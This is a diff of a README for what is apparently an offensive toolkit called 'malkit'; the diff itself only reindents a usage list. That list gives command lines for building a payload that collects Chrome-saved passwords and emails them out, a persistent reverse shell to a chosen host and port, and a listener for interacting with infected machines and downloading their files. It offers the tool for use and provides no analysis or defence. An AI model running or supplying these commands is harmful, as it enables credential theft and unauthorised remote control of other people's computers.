@@ -176,22 +176,22 @@ example:
  
 
  * Grabbing and sending chrome-saved passwords through email
-  - `python malkit.py build_chromepass --email --address youremailaddress@yourdomain.com`  
+    - `python malkit.py build_chromepass --email --address youremailaddress@yourdomain.com`  
 
  * Creating a persistent reverse_shell with additional features
-  - `python malkit.py build_malware --host 127.0.0.1 -p 444`
-  - Replace the host with your external/internal ip as needed
-  - Replace the port as needed
-  - Make sure you build the listener as well and run it.  
+    - `python malkit.py build_malware --host 127.0.0.1 -p 444`
+    - Replace the host with your external/internal ip as needed
+    - Replace the port as needed
+    - Make sure you build the listener as well and run it.  
  
  * Creating a listener for the malware
-  - `python malkit.py build_listener -p 444`
-  - This is the listener for the malware
-  - While in the shell, you can use the `list` command to see active sessions.
-  - You can interact with a session by using the command: `interact::SESSION_NUMBER` where `SESSION_NUMBER` is the number of the session yo want to connect with. 
-  - To go back into listener mode after interacting with a session, use the command `<bg` or `<background`
-  - Other commands while interacting have been added but still experimental:
-    - `<download` - Downloads a file from the server
+    - `python malkit.py build_listener -p 444`
+    - This is the listener for the malware
+    - While in the shell, you can use the `list` command to see active sessions.
+    - You can interact with a session by using the command: `interact::SESSION_NUMBER` where `SESSION_NUMBER` is the number of the session yo want to connect with. 
+    - To go back into listener mode after interacting with a session, use the command `<bg` or `<background`
+    - Other commands while interacting have been added but still experimental:
+      - `<download` - Downloads a file from the server
 
 
 ## Todo
